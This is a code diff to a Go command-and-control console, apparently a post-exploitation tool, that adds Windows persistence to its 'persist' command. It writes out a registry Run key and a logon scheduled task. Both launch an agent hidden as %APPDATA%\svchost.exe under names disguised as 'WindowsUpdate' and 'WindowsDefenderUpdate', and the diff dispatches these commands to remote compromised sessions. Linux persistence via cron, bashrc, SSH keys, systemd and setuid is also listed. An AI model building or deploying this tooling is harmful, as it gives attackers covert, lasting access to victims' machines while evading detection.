@@ -6,6 +6,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"alcapwn/proto"
 )
 
 // cmdLabels manages session labels
@@ -218,7 +220,8 @@ func (c *Console) cmdNotes(args []string) {
 //	persist assign <profile_id> <id> - Assign profile to session
 //	persist unassign <profile_id> <id> - Remove session from profile
 //
-// Methods: cron, bashrc, sshkey, systemd, setuid
+// Linux methods: cron, bashrc, sshkey, systemd, setuid
+// Windows methods: reg, schtask
 func (c *Console) cmdPersist(args []string) {
 	if len(args) == 0 {
 		fmt.Println("[!] Usage:")
@@ -269,7 +272,8 @@ func (c *Console) cmdPersist(args []string) {
 		method = strings.ToLower(args[1])
 	} else {
 		fmt.Println("[!] Usage: persist <id> <method> [profile_name]")
-		fmt.Println("Methods: cron, bashrc, sshkey, systemd, setuid")
+		fmt.Println("Linux methods:   cron, bashrc, sshkey, systemd, setuid")
+		fmt.Println("Windows methods: reg, schtask")
 		return
 	}
 
@@ -290,13 +294,32 @@ func (c *Console) cmdPersist(args []string) {
 		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
-	if sess.Upgrader == nil {
-		sess.mu.Unlock()
+	isAgent := sess.IsAgent
+	u := sess.Upgrader
+	sess.mu.Unlock()
+
+	if !isAgent && u == nil {
 		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
 		return
 	}
-	u := sess.Upgrader
-	sess.mu.Unlock()
+
+	// Windows-only methods require an agent session.
+	winMethods := map[string]bool{"reg": true, "schtask": true}
+	if winMethods[method] && !isAgent {
+		fmt.Printf("[!] Method '%s' is Windows-only and requires an agent session.\n", method)
+		return
+	}
+	// Linux-only methods don't make sense on Windows agents.
+	linuxMethods := map[string]bool{"cron": true, "bashrc": true, "sshkey": true, "systemd": true, "setuid": true}
+	if isAgent && linuxMethods[method] {
+		sess.mu.Lock()
+		isWindows := sess.AgentMeta != nil && sess.AgentMeta.OS == "windows"
+		sess.mu.Unlock()
+		if isWindows {
+			fmt.Printf("[!] Method '%s' is Linux-only. Use 'reg' or 'schtask' for Windows agents.\n", method)
+			return
+		}
+	}
 
 	// Get listener address from session and parse host/port
 	listenerAddr := sess.ListenerAddr
@@ -341,8 +364,20 @@ WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl e
 	case "setuid":
 		cmd = `chmod u+s /path/to/binary`
 		msg = "SUID bit set (requires SUID binary upload first)"
+	case "reg":
+		// Windows: HKCU Run key — no elevation needed.
+		agentPath := `%APPDATA%\svchost.exe`
+		cmd = fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%s" /f`, agentPath)
+		msg = fmt.Sprintf("Registry Run key set (HKCU). Agent should be placed at %s before reboot.", agentPath)
+	case "schtask":
+		// Windows: scheduled task — runs on logon, no elevation needed for HKCU task.
+		agentPath := `%APPDATA%\svchost.exe`
+		cmd = fmt.Sprintf(`schtasks /create /tn "WindowsDefenderUpdate" /tr "%s" /sc onlogon /f`, agentPath)
+		msg = fmt.Sprintf("Scheduled task created (on logon). Agent should be placed at %s.", agentPath)
 	default:
-		fmt.Println("[!] Unknown method. Use: cron, bashrc, sshkey, systemd, setuid")
+		fmt.Println("[!] Unknown method.")
+		fmt.Println("    Linux methods:   cron, bashrc, sshkey, systemd, setuid")
+		fmt.Println("    Windows methods: reg, schtask")
 		return
 	}
 
@@ -447,6 +482,28 @@ WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl e
 
 	// Execute the persistence command on the remote session.
 	fmt.Printf("[*] Executing on session %d...\n", id)
+
+	if isAgent {
+		res, err := agentDispatch(sess, proto.Task{
+			ID:      agentTaskID("persist", method),
+			Kind:    proto.TaskExec,
+			Command: cmd,
+		}, 15*time.Second)
+		if err != nil {
+			fmt.Printf("[!] Persistence command failed: %v\n", err)
+			return
+		}
+		if res.Error != "" {
+			fmt.Printf("[!] Persistence error: %s\n", res.Error)
+			return
+		}
+		if len(res.Output) > 0 {
+			fmt.Printf("%s\n", stripDangerousAnsi(strings.TrimSpace(string(res.Output))))
+		}
+		fmt.Printf("[+] %s\n", msg)
+		return
+	}
+
 	if err := u.write(cmd + "\n"); err != nil {
 		fmt.Printf("[!] Failed to send persistence command: %v\n", err)
 		return
